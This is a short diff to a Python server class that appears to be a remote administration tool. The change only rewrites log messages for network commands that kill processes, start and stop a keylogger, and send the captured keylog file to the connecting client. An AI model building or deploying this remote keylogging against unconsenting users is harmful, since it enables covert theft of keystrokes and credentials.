@@ -84,31 +84,28 @@ class Server:
 
         # Kill process
         elif data == CMD_KILL_PROCESS.encode():
-          print(f'[KILL] {addr} requested kill process.')
+          print(f'[KILL] {addr} requested kill process/app.')
           pid = conn.recv(BUFFER_SIZE).decode()
           self.kill_process(pid)
-          print(f'[KILL] {addr} killed process.')
+          print(f'[KILL] {addr} killed process/app.')
 
         # Start keylogger
         elif data == CMD_START_KEYLOGGER.encode():
           print(f'[KEYLOGGER] {addr} requested start keylogger.')
-          print('Starting keylogger')
           self.start_keylogger()
-          print('Keylogger started')
+          print(f'[KEYLOGGER] {addr} started keylogger.')
 
         # Stop keylogger
         elif data == CMD_STOP_KEYLOGGER.encode():
           print(f'[KEYLOGGER] {addr} requested stop keylogger.')
-          print('Stopping keylogger')
           self.stop_keylogger()
-          print('Keylogger stopped')
-        
+          print(f'[KEYLOGGER] {addr} stopped keylogger.')
+
         # Print keylogger
         elif data == CMD_PRINT_KEYLOGGER.encode():
           print(f'[KEYLOGGER] {addr} requested print keylogger.')
-          print('Printing keylogger')
           self.send_file(os.path.join(TMP_PATH, 'keylog.txt'), conn)
-          print('Keylogger printed')
+          print(f'[KEYLOGGER] {addr} sent keylogger.')
 
         # View apps
         elif data == CMD_VIEW_APPS.encode():
